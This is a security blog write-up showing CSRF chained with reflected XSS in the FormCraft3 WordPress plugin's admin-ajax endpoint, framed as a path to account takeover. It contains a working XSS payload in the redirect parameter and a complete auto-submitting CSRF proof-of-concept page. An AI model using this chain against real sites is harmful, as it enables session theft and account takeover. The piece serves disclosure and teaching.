---
date: '2026-10-27T22:56:23+01:00'
title: 'CSRF Chained To XSS Leading To Account Takeover'
description: "In this blog, I found an XSS vulnerability chained together with a CSRF misconfiguration on a live target leading to ATO"
---

In this blog, I discovered a **Cross-Site Scripting (XSS)** vulnerability, a bug that can allow an attacker to execute malicious JavaScript in another user's browser, and chained it with a **Cross-Site Request Forgery (CSRF)** misconfiguration, which can trick a logged-in user’s browser into performing unwanted actions. Together, these flaws created a path to **Account Takeover (ATO)**, potentially allowing an attacker to _gain control of another user's account_.

Recently Came across a web application with the below request field

```bash
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com

action=formcraft3_form_submit&field1=REDACTED&website=&id=2&location=&emails=REDACTED&hidden=&redirect=&type=all&triggerIntegration=undefined&fieldLabels=undefined&formcraft3_wpnonce=undefined
```

The POST data included the `formcraft3_wpnonce=undefined` parameter, Literally the string “**undefined**,” not a real nonce and the server still accepted it. That tells us the endpoint either:

- doesn’t check the nonce at all for this action, or
- checks for its _presence_ but doesn’t actually validate it against a server-side expected value

Either way, the server has no way to distinguish “a request that originated from the real form on the real page” from “a request forged by any arbitrary site.” This is the entire CSRF vulnerability in one line, nonces exist specifically to prove the request came from a page the server itself rendered for that user’s session.

Attaching the XSS payload (`img src=/ onerror=alert(document.cookie)`) on the `redirect=` parameter get triggered with the below response

```bash
HTTP/1.1 200 OK

{"errors":[],"success":"Message received","submission_id":2027,"debug":{"failed":["Email Not Sent: Email setup error"]},"redirect":"<img src=\/ onerror=alert(document.cookie)>"}
```

![](https://i.imgur.com/GyF1BEm.png)

Since this is affected by the login workflow we can go ahead and create a CSRF PoC 

```
<!DOCTYPE html>
<html>
<body>
<h3>CSRF PoC - FormCraft3 Form Submission (admin-ajax.php)</h3>
<form id="csrf-poc" action="https://example.com/wp-admin/admin-ajax.php" method="POST">
  <input type="hidden" name="action" value="formcraft3_form_submit">
  <input type="hidden" name="field1" value="attacker-controlled@evil.com">
  <input type="hidden" name="website" value="">
  <input type="hidden" name="id" value="2">
  <input type="hidden" name="location" value="https://example.com/">
  <input type="hidden" name="emails" value="attacker-controlled@evil.com">
  <input type="hidden" name="hidden" value="">
  <input type="hidden" name="redirect" value='&lt;img src=/ onerror=alert(document.cookie)&gt;'>
  <input type="hidden" name="type" value="all">
  <input type="hidden" name="triggerIntegration" value="undefined">
  <input type="hidden" name="fieldLabels" value="undefined">
  <input type="hidden" name="formcraft3_wpnonce" value="undefined">
</form>
<script>
  document.getElementById('csrf-poc').submit();
</script>
</body>
</html>
```

Once the user logins to the legitimate website they can go to our hosted CSRF PoC website and they would be redirected to the legitimate website with their cookie stolen to the attacker server

In other to craft the cookie stealer payload, you can use this my [blog](https://sec-fortress.github.io/posts/articles/posts/Exfiltrating%20Cookies%20Through%20Stored%20XSS.html) to learn how to do this.

Wordfence was deployed by the client shortly after this testing, so further live verification wasn’t possible; the sink behavior below was reproduced locally to illustrate impact, 😛.


![](https://i.imgur.com/Rql8EG7.png)

Arigato gozaimasu 3>